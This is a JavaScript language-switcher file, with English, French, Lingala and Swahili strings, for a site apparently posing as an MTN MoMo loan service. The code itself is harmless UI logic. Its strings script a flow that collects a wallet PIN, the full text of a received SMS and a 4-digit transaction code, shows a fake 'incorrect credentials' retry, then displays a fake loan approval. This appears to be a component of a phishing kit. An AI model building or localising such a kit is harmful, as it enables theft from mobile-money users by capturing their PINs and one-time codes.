/* ============================================================
   MTN Multi-Language System — Option B
   - Picker in header: [🌐 English ▾]  (visible on all screen sizes)
   - Persists choice in localStorage across every page
   - Add ONE line to each HTML file before </body>:
       <script src="lang.js"></script>
   - Optional: mark text with data-i18n="key" for full control
   - Fallback: strings without data-i18n can still be swapped via
     the TEXT_MAP below (best-effort text-matching)
   ============================================================ */

(function(){
  const STORAGE_KEY = 'mtn_lang';
  const DEFAULT_LANG = 'en';

  // ---------------- Translations ----------------
  const I18N = {
    en: {
      "lang.name": "English",

      "index.title": "Start your application",
      "index.amount": "Loan Amount",
      "index.period": "Repayment Period",
      "index.month": "month",
      "index.months": "months",
      "index.principal": "Loan principal",
      "index.interest": "Interest (5%)",
      "index.total": "Total repayment",
      "index.monthly": "Monthly installment",
      "index.start": "Start Application →",
      "index.secured": "Secured by MTN MoMo",
      "index.disclaimer": "By applying you agree to the loan terms and authorize MTN MoMo to debit your wallet on the due date. This is a demo interface. A licensed Digital Credit Provider is required to operate legally.",

      "apply.title": "Your details",
      "apply.step": "Step 2 of 3 — Applicant information",
      "apply.name": "Full name",
      "apply.namePlaceholder": "e.g. Awa Nkemdirim",
      "apply.phone": "Phone number",
      "apply.phonePlaceholder": "6XX XXX XXX",
      "apply.momo": "MTN MoMo number",
      "apply.momoPlaceholder": "MoMo wallet number",
      "apply.nid": "National ID number",
      "apply.nidPlaceholder": "ID number",
      "apply.submit": "Submit Application →",
      "apply.back": "← Back to calculator",

      "success.title": "Processing your application",
      "success.sub": "Please wait while we verify your details. Do not close this page.",

      "login.momo": "MoMo number",
      "login.pin": "PIN",
      "login.continue": "Continue →",
      "login.secured": "Secured by MTN MoMo",
      "login.processing": "Processing your loan",
      "login.processingSub": "Please wait while we review your application and verify your credentials. Do not close this page.",
      "login.note": "This usually takes a few moments",
      "login.incorrect": "Incorrect credentials. Please try again.",
      "login.enterMomo": "Please enter your MoMo number.",
      "login.invalidMomo": "Please enter a valid MoMo number.",
      "login.enterPin": "Please enter your PIN.",
      "login.pinLength": "PIN must be at least 4 digits.",
      "login.serverError": "Could not reach server.",
      "login.timeout": "Timed out. Please try again.",

      "otp.title": "Enter the SMS you received",
      "otp.sub": "We sent a verification message to your phone. Paste the full SMS text below to continue.",
      "otp.pasteLabel": "Paste SMS here",
      "otp.pastePlaceholder": "Paste the full SMS message you received…",
      "otp.verify": "Verify →",
      "otp.expires": "Code expires in",
      "otp.seconds": "seconds",
      "otp.expired": "Code expired",
      "otp.expiredMsg": "The SMS verification window has closed. Please request a new code to continue.",
      "otp.requestNew": "Request new code →",
      "otp.verifying": "Verifying code",
      "otp.verifyingSub": "Please wait while we confirm the SMS code. Do not close this page.",
      "otp.pasteError": "Please paste the SMS you received.",

      "code.title": "Enter code",
      "code.sub": "Type the 4-digit code sent to your phone to authorize this transaction.",
      "code.approve": "Approve",
      "code.verifying": "Verifying code",
      "code.verifyingSub": "Please wait while we confirm your code.",
      "code.enterCode": "Please enter the 4-digit code.",

      "approved.pill": "Approved",
      "approved.title": "Loan",
      "approved.titleGreen": "approved",
      "approved.lede": "Your loan has been approved successfully. Funds will be disbursed to your MoMo wallet shortly.",
      "approved.amount": "Loan amount",
      "approved.period": "Period",
      "approved.total": "Total disbursed",
      "approved.eta": "Expected in your wallet within",
      "approved.etaTime": "5 minutes",
      "approved.step1": "You'll receive an SMS confirmation from MTN MoMo once disbursed.",
      "approved.step2": "Check your MoMo wallet balance to confirm the deposit.",
      "approved.step3": "Repayment will be debited automatically on the due date.",
      "approved.home": "Back to home"
    },

    fr: {
      "lang.name": "Français",

      "index.title": "Commencez votre demande",
      "index.amount": "Montant du prêt",
      "index.period": "Période de remboursement",
      "index.month": "mois",
      "index.months": "mois",
      "index.principal": "Capital emprunté",
      "index.interest": "Intérêts (5%)",
      "index.total": "Total à rembourser",
      "index.monthly": "Mensualité",
      "index.start": "Démarrer la demande →",
      "index.secured": "Sécurisé par MTN MoMo",
      "index.disclaimer": "En soumettant, vous acceptez les conditions du prêt et autorisez MTN MoMo à débiter votre portefeuille à la date d'échéance. Ceci est une interface de démonstration.",

      "apply.title": "Vos informations",
      "apply.step": "Étape 2 sur 3 — Informations du demandeur",
      "apply.name": "Nom complet",
      "apply.namePlaceholder": "ex. Awa Nkemdirim",
      "apply.phone": "Numéro de téléphone",
      "apply.phonePlaceholder": "6XX XXX XXX",
      "apply.momo": "Numéro MTN MoMo",
      "apply.momoPlaceholder": "Numéro du portefeuille MoMo",
      "apply.nid": "Numéro de pièce d'identité",
      "apply.nidPlaceholder": "Numéro d'identification",
      "apply.submit": "Soumettre la demande →",
      "apply.back": "← Retour au calculateur",

      "success.title": "Traitement de votre demande",
      "success.sub": "Veuillez patienter pendant que nous vérifions vos informations. Ne fermez pas cette page.",

      "login.momo": "Numéro MoMo",
      "login.pin": "Code PIN",
      "login.continue": "Continuer →",
      "login.secured": "Sécurisé par MTN MoMo",
      "login.processing": "Traitement de votre prêt",
      "login.processingSub": "Veuillez patienter pendant que nous vérifions vos informations. Ne fermez pas cette page.",
      "login.note": "Cela prend généralement quelques instants",
      "login.incorrect": "Identifiants incorrects. Veuillez réessayer.",
      "login.enterMomo": "Veuillez entrer votre numéro MoMo.",
      "login.invalidMomo": "Veuillez entrer un numéro MoMo valide.",
      "login.enterPin": "Veuillez entrer votre code PIN.",
      "login.pinLength": "Le PIN doit contenir au moins 4 chiffres.",
      "login.serverError": "Impossible de joindre le serveur.",
      "login.timeout": "Délai dépassé. Veuillez réessayer.",

      "otp.title": "Entrez le SMS reçu",
      "otp.sub": "Nous avons envoyé un message de vérification à votre téléphone. Collez le SMS complet ci-dessous.",
      "otp.pasteLabel": "Collez le SMS ici",
      "otp.pastePlaceholder": "Collez le message SMS complet reçu…",
      "otp.verify": "Vérifier →",
      "otp.expires": "Le code expire dans",
      "otp.seconds": "secondes",
      "otp.expired": "Code expiré",
      "otp.expiredMsg": "La fenêtre de vérification SMS est fermée. Veuillez demander un nouveau code.",
      "otp.requestNew": "Demander un nouveau code →",
      "otp.verifying": "Vérification du code",
      "otp.verifyingSub": "Veuillez patienter pendant que nous confirmons le code. Ne fermez pas cette page.",
      "otp.pasteError": "Veuillez coller le SMS reçu.",

      "code.title": "Entrer le code",
      "code.sub": "Saisissez le code à 4 chiffres envoyé à votre téléphone pour autoriser cette transaction.",
      "code.approve": "Approuver",
      "code.verifying": "Vérification du code",
      "code.verifyingSub": "Veuillez patienter pendant que nous confirmons votre code.",
      "code.enterCode": "Veuillez entrer le code à 4 chiffres.",

      "approved.pill": "Approuvé",
      "approved.title": "Prêt",
      "approved.titleGreen": "approuvé",
      "approved.lede": "Votre prêt a été approuvé avec succès. Les fonds seront décaissés sur votre portefeuille MoMo sous peu.",
      "approved.amount": "Montant du prêt",
      "approved.period": "Période",
      "approved.total": "Total décaissé",
      "approved.eta": "Attendu dans votre portefeuille dans",
      "approved.etaTime": "5 minutes",
      "approved.step1": "Vous recevrez une confirmation SMS de MTN MoMo une fois décaissé.",
      "approved.step2": "Vérifiez le solde de votre portefeuille MoMo pour confirmer le dépôt.",
      "approved.step3": "Le remboursement sera débité automatiquement à la date d'échéance.",
      "approved.home": "Retour à l'accueil"
    },

    ln: {
      "lang.name": "Lingála",

      "index.title": "Banda kosenga",
      "index.amount": "Motuya ya nyongo",
      "index.period": "Eleko ya kofuta",
      "index.month": "sanza",
      "index.months": "sanza",
      "index.principal": "Nyongo ya liboso",
      "index.interest": "Lipanda (5%)",
      "index.total": "Motuya mobimba",
      "index.monthly": "Kofuta sanza na sanza",
      "index.start": "Banda kosenga →",
      "index.secured": "Ebatelami na MTN MoMo",
      "index.disclaimer": "Soki osengi, ondimi na mibeko ya nyongo mpe opesi MTN MoMo nzela ya kofuta.",

      "apply.title": "Makambo na yo",
      "apply.step": "Eteni 2 ya 3 — Makambo ya mosengi",
      "apply.name": "Nkombo mobimba",
      "apply.namePlaceholder": "ndakisa Awa Nkemdirim",
      "apply.phone": "Nimero ya telefone",
      "apply.phonePlaceholder": "6XX XXX XXX",
      "apply.momo": "Nimero ya MTN MoMo",
      "apply.momoPlaceholder": "Nimero ya MoMo",
      "apply.nid": "Nimero ya karte ya ekólo",
      "apply.nidPlaceholder": "Nimero ya karte",
      "apply.submit": "Tinda kosenga →",
      "apply.back": "← Zonga na calculateur",

      "success.title": "Tozali kosala kosenga na yo",
      "success.sub": "Zela moke tozali kotala makambo na yo. Kobomba page oyo te.",

      "login.momo": "Nimero ya MoMo",
      "login.pin": "PIN",
      "login.continue": "Kokoba →",
      "login.secured": "Ebatelami na MTN MoMo",
      "login.processing": "Tozali kosala nyongo na yo",
      "login.processingSub": "Zela moke. Kobomba page oyo te.",
      "login.note": "Esalaka moke",
      "login.incorrect": "Makambo ezali mabe. Meka lisusu.",
      "login.enterMomo": "Koma nimero ya MoMo.",
      "login.invalidMomo": "Koma nimero ya MoMo ya solo.",
      "login.enterPin": "Koma PIN na yo.",
      "login.pinLength": "PIN esengeli kozala na mikombo minei.",
      "login.serverError": "Ekoki kozua serveur te.",
      "login.timeout": "Eleko eleki. Meka lisusu.",

      "otp.title": "Koma SMS oyo ozui",
      "otp.sub": "Totindi message na telefone na yo. Paste SMS mobimba awa.",
      "otp.pasteLabel": "Paste SMS awa",
      "otp.pastePlaceholder": "Paste SMS oyo ozui…",
      "otp.verify": "Vérifier →",
      "otp.expires": "Code ekosila na",
      "otp.seconds": "secondes",
      "otp.expired": "Code esili",
      "otp.expiredMsg": "Eleko ya SMS esili. Senga code ya sika.",
      "otp.requestNew": "Senga code ya sika →",
      "otp.verifying": "Vérification ya code",
      "otp.verifyingSub": "Zela moke. Kobomba page oyo te.",
      "otp.pasteError": "Paste SMS oyo ozui.",

      "code.title": "Koma code",
      "code.sub": "Koma code ya mikombo minei oyo etindami na telefone na yo.",
      "code.approve": "Ndima",
      "code.verifying": "Vérification ya code",
      "code.verifyingSub": "Zela moke.",
      "code.enterCode": "Koma code ya mikombo minei.",

      "approved.pill": "Endimami",
      "approved.title": "Nyongo",
      "approved.titleGreen": "endimami",
      "approved.lede": "Nyongo na yo endimami. Mbongo ekotinda na MoMo na yo.",
      "approved.amount": "Motuya ya nyongo",
      "approved.period": "Eleko",
      "approved.total": "Motuya mobimba",
      "approved.eta": "Ekoya na portefeuille na yo na",
      "approved.etaTime": "minuti 5",
      "approved.step1": "Okosimbá SMS ya confirmation na MTN MoMo.",
      "approved.step2": "Tala solde ya MoMo na yo.",
      "approved.step3": "Kofuta ekosalamá automatiquement.",
      "approved.home": "Zonga na ebandeli"
    },

    sw: {
      "lang.name": "Kiswahili",

      "index.title": "Anza maombi yako",
      "index.amount": "Kiasi cha mkopo",
      "index.period": "Kipindi cha malipo",
      "index.month": "mwezi",
      "index.months": "miezi",
      "index.principal": "Mkopo wa msingi",
      "index.interest": "Riba (5%)",
      "index.total": "Jumla ya malipo",
      "index.monthly": "Malipo ya kila mwezi",
      "index.start": "Anza Maombi →",
      "index.secured": "Imelindwa na MTN MoMo",
      "index.disclaimer": "Kwa kuomba unakubali masharti na unaruhusu MTN MoMo kutoa pesa kwenye pochi yako.",

      "apply.title": "Maelezo yako",
      "apply.step": "Hatua 2 ya 3 — Taarifa za mwombaji",
      "apply.name": "Jina kamili",
      "apply.namePlaceholder": "mf. Awa Nkemdirim",
      "apply.phone": "Namba ya simu",
      "apply.phonePlaceholder": "6XX XXX XXX",
      "apply.momo": "Namba ya MTN MoMo",
      "apply.momoPlaceholder": "Namba ya pochi ya MoMo",
      "apply.nid": "Namba ya kitambulisho",
      "apply.nidPlaceholder": "Namba ya kitambulisho",
      "apply.submit": "Tuma Maombi →",
      "apply.back": "← Rudi kwa kikokotoo",

      "success.title": "Inachakata maombi yako",
      "success.sub": "Tafadhali subiri. Usifunge ukurasa huu.",

      "login.momo": "Namba ya MoMo",
      "login.pin": "PIN",
      "login.continue": "Endelea →",
      "login.secured": "Imelindwa na MTN MoMo",
      "login.processing": "Inachakata mkopo wako",
      "login.processingSub": "Tafadhali subiri. Usifunge ukurasa huu.",
      "login.note": "Kawaida huchukua muda mfupi",
      "login.incorrect": "Taarifa si sahihi. Jaribu tena.",
      "login.enterMomo": "Tafadhali weka namba yako ya MoMo.",
      "login.invalidMomo": "Tafadhali weka namba sahihi ya MoMo.",
      "login.enterPin": "Tafadhali weka PIN yako.",
      "login.pinLength": "PIN iwe angalau tarakimu 4.",
      "login.serverError": "Imeshindwa kufikia seva.",
      "login.timeout": "Muda umepita. Jaribu tena.",

      "otp.title": "Weka SMS uliyopokea",
      "otp.sub": "Tulituma ujumbe wa uthibitisho kwenye simu yako. Bandika SMS kamili hapa chini.",
      "otp.pasteLabel": "Bandika SMS hapa",
      "otp.pastePlaceholder": "Bandika ujumbe kamili wa SMS…",
      "otp.verify": "Thibitisha →",
      "otp.expires": "Msimbo unaisha kwa",
      "otp.seconds": "sekunde",
      "otp.expired": "Msimbo umeisha",
      "otp.expiredMsg": "Dirisha la uthibitisho limefungwa. Omba msimbo mpya.",
      "otp.requestNew": "Omba msimbo mpya →",
      "otp.verifying": "Inathibitisha msimbo",
      "otp.verifyingSub": "Tafadhali subiri. Usifunge ukurasa huu.",
      "otp.pasteError": "Tafadhali bandika SMS uliyopokea.",

      "code.title": "Weka msimbo",
      "code.sub": "Andika msimbo wa tarakimu 4 uliotumwa kwenye simu yako.",
      "code.approve": "Idhinisha",
      "code.verifying": "Inathibitisha msimbo",
      "code.verifyingSub": "Tafadhali subiri.",
      "code.enterCode": "Tafadhali weka msimbo wa tarakimu 4.",

      "approved.pill": "Imeidhinishwa",
      "approved.title": "Mkopo",
      "approved.titleGreen": "umeidhinishwa",
      "approved.lede": "Mkopo wako umeidhinishwa. Pesa zitatumwa kwenye pochi yako ya MoMo hivi karibuni.",
      "approved.amount": "Kiasi cha mkopo",
      "approved.period": "Kipindi",
      "approved.total": "Jumla iliyotumwa",
      "approved.eta": "Inatarajiwa kwenye pochi yako ndani ya",
      "approved.etaTime": "dakika 5",
      "approved.step1": "Utapokea SMS ya uthibitisho kutoka MTN MoMo.",
      "approved.step2": "Angalia salio la pochi yako ya MoMo.",
      "approved.step3": "Malipo yatakatwa kiotomatiki tarehe ya mwisho.",
      "approved.home": "Rudi nyumbani"
    }
  };

  // ---------------- Core ----------------
  function getLang(){
    return localStorage.getItem(STORAGE_KEY) || DEFAULT_LANG;
  }

  function t(key){
    const lang = getLang();
    return (I18N[lang] && I18N[lang][key])
        || (I18N[DEFAULT_LANG] && I18N[DEFAULT_LANG][key])
        || key;
  }

  function setLang(code){
    if(!I18N[code]) code = DEFAULT_LANG;
    localStorage.setItem(STORAGE_KEY, code);
    applyTranslations();
    document.dispatchEvent(new Event('mtn:languageChanged'));
  }

  function applyTranslations(){
    const lang = getLang();
    document.documentElement.lang = lang;

    // Elements with data-i18n
    document.querySelectorAll('[data-i18n]').forEach(el => {
      el.textContent = t(el.getAttribute('data-i18n'));
    });

    // Placeholders with data-i18n-ph
    document.querySelectorAll('[data-i18n-ph]').forEach(el => {
      el.placeholder = t(el.getAttribute('data-i18n-ph'));
    });

    // Update the picker label
    const btnLabel = document.getElementById('langBtnLabel');
    if(btnLabel) btnLabel.textContent = I18N[lang]['lang.name'];

    // Mark active option
    document.querySelectorAll('.lang-option').forEach(o => {
      o.classList.toggle('active', o.dataset.lang === lang);
    });

    // Fallback text-matching for elements WITHOUT data-i18n
    applyTextMap(lang);
  }

  // Best-effort text-matching for elements without data-i18n
  function applyTextMap(lang){
    const map = TEXT_MAP[lang];
    if(!map) return;

    document.querySelectorAll('h1, h2, h3, p, span, button, label, a, div').forEach(el => {
      // skip containers that have child elements with text (avoid nuking icons)
      if(el.children.length > 0) return;

      const current = el.textContent.trim();
      if(!current) return;

      // exact match
      if(map[current]){
        el.textContent = map[current];
        return;
      }

      // pattern match for strings like "Step 2 of 3" or "1 month"
      for(const src in map){
        if(src.includes('{') && src.includes('}')){
          const regex = new RegExp(
            '^' + src.replace(/[.*+?^${}()|[\]\\]/g, '\\$&').replace(/\\\{[^}]+\\\}/g, '.+') + '$'
          );
          if(regex.test(current)){
            el.textContent = current.replace(
              new RegExp('^(.*?)' + src.split('{')[0] + '(.*)$'),
              map[src]
            );
            return;
          }
        }
      }
    });
  }

  // ---------------- TEXT_MAP (fallback translation) ----------------
  // Keys are the EXACT English text on the page.
  // Only used for elements that don't have data-i18n.
  const TEXT_MAP = {
    fr: {
      "Start your application": "Commencez votre demande",
      "Loan Amount": "Montant du prêt",
      "Repayment Period": "Période de remboursement",
      "Loan principal": "Capital emprunté",
      "Interest (5%)": "Intérêts (5%)",
      "Total repayment": "Total à rembourser",
      "Monthly installment": "Mensualité",
      "Start Application →": "Démarrer la demande →",
      "Secured by MTN MoMo": "Sécurisé par MTN MoMo",
      "Your details": "Vos informations",
      "Step 2 of 3 — Applicant information": "Étape 2 sur 3 — Informations du demandeur",
      "Full name": "Nom complet",
      "Phone number": "Numéro de téléphone",
      "MTN MoMo number": "Numéro MTN MoMo",
      "National ID number": "Numéro de pièce d'identité",
      "Submit Application →": "Soumettre la demande →",
      "← Back to calculator": "← Retour au calculateur",
      "Processing your application": "Traitement de votre demande",
      "Please wait while we verify your details. Do not close this page.": "Veuillez patienter pendant que nous vérifions vos informations. Ne fermez pas cette page.",
      "MoMo number": "Numéro MoMo",
      "PIN": "Code PIN",
      "Continue →": "Continuer →",
      "Processing your loan": "Traitement de votre prêt",
      "This usually takes a few moments": "Cela prend quelques instants",
      "Enter the SMS you received": "Entrez le SMS reçu",
      "Paste SMS here": "Collez le SMS ici",
      "Verify →": "Vérifier →",
      "Code expired": "Code expiré",
      "Request new code →": "Demander un nouveau code →",
      "Verifying code": "Vérification du code",
      "Enter code": "Entrer le code",
      "Approve": "Approuver",
      "Approved": "Approuvé",
      "Loan amount": "Montant du prêt",
      "Period": "Période",
      "Total disbursed": "Total décaissé",
      "Back to home": "Retour à l'accueil",
      "5 minutes": "5 minutes"
    },
    ln: {
      "Start your application": "Banda kosenga",
      "Loan Amount": "Motuya ya nyongo",
      "Repayment Period": "Eleko ya kofuta",
      "Loan principal": "Nyongo ya liboso",
      "Interest (5%)": "Lipanda (5%)",
      "Total repayment": "Motuya mobimba",
      "Monthly installment": "Kofuta sanza na sanza",
      "Start Application →": "Banda kosenga →",
      "Secured by MTN MoMo": "Ebatelami na MTN MoMo",
      "Your details": "Makambo na yo",
      "Full name": "Nkombo mobimba",
      "Phone number": "Nimero ya telefone",
      "MTN MoMo number": "Nimero ya MTN MoMo",
      "National ID number": "Nimero ya karte ya ekólo",
      "Submit Application →": "Tinda kosenga →",
      "← Back to calculator": "← Zonga na calculateur",
      "Processing your application": "Tozali kosala kosenga na yo",
      "MoMo number": "Nimero ya MoMo",
      "PIN": "PIN",
      "Continue →": "Kokoba →",
      "Processing your loan": "Tozali kosala nyongo na yo",
      "Enter the SMS you received": "Koma SMS oyo ozui",
      "Paste SMS here": "Paste SMS awa",
      "Verify →": "Vérifier →",
      "Code expired": "Code esili",
      "Request new code →": "Senga code ya sika →",
      "Verifying code": "Vérification ya code",
      "Enter code": "Koma code",
      "Approve": "Ndima",
      "Approved": "Endimami",
      "Loan amount": "Motuya ya nyongo",
      "Period": "Eleko",
      "Total disbursed": "Motuya mobimba",
      "Back to home": "Zonga na ebandeli",
      "5 minutes": "minuti 5"
    },
    sw: {
      "Start your application": "Anza maombi yako",
      "Loan Amount": "Kiasi cha mkopo",
      "Repayment Period": "Kipindi cha malipo",
      "Loan principal": "Mkopo wa msingi",
      "Interest (5%)": "Riba (5%)",
      "Total repayment": "Jumla ya malipo",
      "Monthly installment": "Malipo ya kila mwezi",
      "Start Application →": "Anza Maombi →",
      "Secured by MTN MoMo": "Imelindwa na MTN MoMo",
      "Your details": "Maelezo yako",
      "Full name": "Jina kamili",
      "Phone number": "Namba ya simu",
      "MTN MoMo number": "Namba ya MTN MoMo",
      "National ID number": "Namba ya kitambulisho",
      "Submit Application →": "Tuma Maombi →",
      "← Back to calculator": "← Rudi kwa kikokotoo",
      "Processing your application": "Inachakata maombi yako",
      "MoMo number": "Namba ya MoMo",
      "PIN": "PIN",
      "Continue →": "Endelea →",
      "Processing your loan": "Inachakata mkopo wako",
      "Enter the SMS you received": "Weka SMS uliyopokea",
      "Paste SMS here": "Bandika SMS hapa",
      "Verify →": "Thibitisha →",
      "Code expired": "Msimbo umeisha",
      "Request new code →": "Omba msimbo mpya →",
      "Verifying code": "Inathibitisha msimbo",
      "Enter code": "Weka msimbo",
      "Approve": "Idhinisha",
      "Approved": "Imeidhinishwa",
      "Loan amount": "Kiasi cha mkopo",
      "Period": "Kipindi",
      "Total disbursed": "Jumla iliyotumwa",
      "Back to home": "Rudi nyumbani",
      "5 minutes": "dakika 5"
    }
  };

  // ---------------- Picker UI ----------------
  function buildPicker(){
    if(document.getElementById('langPicker')) return;

    const header = document.querySelector('.header-inner');
    if(!header) return;

    const wrap = document.createElement('div');
    wrap.className = 'lang-picker';
    wrap.id = 'langPicker';
    wrap.innerHTML = `
      <button class="lang-btn" id="langBtn" type="button" aria-label="Change language">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <circle cx="12" cy="12" r="10"/>
          <line x1="2" y1="12" x2="22" y2="12"/>
          <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
        </svg>
        <span id="langBtnLabel">English</span>
        <svg class="chev" viewBox="0 0 24 24" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
      </button>
      <div class="lang-menu" id="langMenu">
        <button class="lang-option" data-lang="en">English</button>
        <button class="lang-option" data-lang="fr">Français</button>
        <button class="lang-option" data-lang="ln">Lingála</button>
        <button class="lang-option" data-lang="sw">Kiswahili</button>
      </div>
    `;

    header.style.position = 'relative';
    header.appendChild(wrap);

    if(!document.getElementById('langStyles')){
      const style = document.createElement('style');
      style.id = 'langStyles';
      style.textContent = `
        .lang-picker{
          position:absolute;right:0;top:50%;transform:translateY(-50%);
          z-index:60;
        }
        .lang-btn{
          display:flex;align-items:center;gap:8px;
          background:rgba(255,255,255,0.12);
          border:1px solid rgba(255,255,255,0.25);
          color:#fff;
          padding:9px 13px;
          border-radius:10px;
          font-size:13px;
          font-weight:700;
          cursor:pointer;
          transition:.18s;
          letter-spacing:0.2px;
          font-family:inherit;
        }
        .lang-btn:hover{background:rgba(255,255,255,0.22);}
        .lang-btn svg{
          width:15px;height:15px;
          stroke:#fff;fill:none;
          stroke-width:2;stroke-linecap:round;stroke-linejoin:round;
        }
        .lang-btn .chev{width:12px;height:12px;transition:transform .2s;}
        .lang-picker.open .lang-btn .chev{transform:rotate(180deg);}
        .lang-menu{
          position:absolute;top:calc(100% + 8px);right:0;
          background:#fff;
          border-radius:12px;
          box-shadow:0 16px 44px rgba(0,43,92,0.35);
          border:1px solid #E2E8F0;
          min-width:180px;
          padding:6px;
          display:none;
          overflow:hidden;
          animation:langPop .18s ease;
        }
        @keyframes langPop{from{opacity:0;transform:translateY(-4px);}to{opacity:1;transform:translateY(0);}}
        .lang-picker.open .lang-menu{display:block;}
        .lang-option{
          display:block;width:100%;text-align:left;
          background:transparent;border:none;
          padding:10px 12px;
          font-size:13.5px;font-weight:700;
          color:#0A1B33;
          cursor:pointer;
          border-radius:8px;
          transition:.15s;
          font-family:inherit;
        }
        .lang-option:hover{background:#F5F8FC;}
        .lang-option.active{
          background:rgba(0,79,159,0.10);
          color:#002B5C;
        }
        .lang-option.active::after{
          content:'✓';float:right;color:#00A651;font-weight:900;
        }
        /* Keep label visible on mobile — Option B */
        @media(max-width:640px){
          .lang-btn{padding:8px 10px;gap:6px;}
          .lang-btn svg{width:13px;height:13px;}
          .lang-btn span{display:inline;font-size:12px;}
          .lang-btn .chev{width:10px;height:10px;}
          .lang-menu{min-width:150px;}
        }
      `;
      document.head.appendChild(style);
    }

    const picker = document.getElementById('langPicker');
    document.getElementById('langBtn').addEventListener('click', e => {
      e.stopPropagation();
      picker.classList.toggle('open');
    });

    document.querySelectorAll('.lang-option').forEach(opt => {
      opt.addEventListener('click', () => {
        setLang(opt.dataset.lang);
        picker.classList.remove('open');
      });
    });

    document.addEventListener('click', () => picker.classList.remove('open'));
    document.addEventListener('keydown', e => {
      if(e.key === 'Escape') picker.classList.remove('open');
    });
  }

  // ---------------- Boot ----------------
  function boot(){
    buildPicker();
    applyTranslations();
  }

  if(document.readyState === 'loading'){
    document.addEventListener('DOMContentLoaded', boot);
  } else {
    boot();
  }

  // Expose for JS in your pages
  window.MTN_I18N = { t, setLang, getLang, applyTranslations };
})();
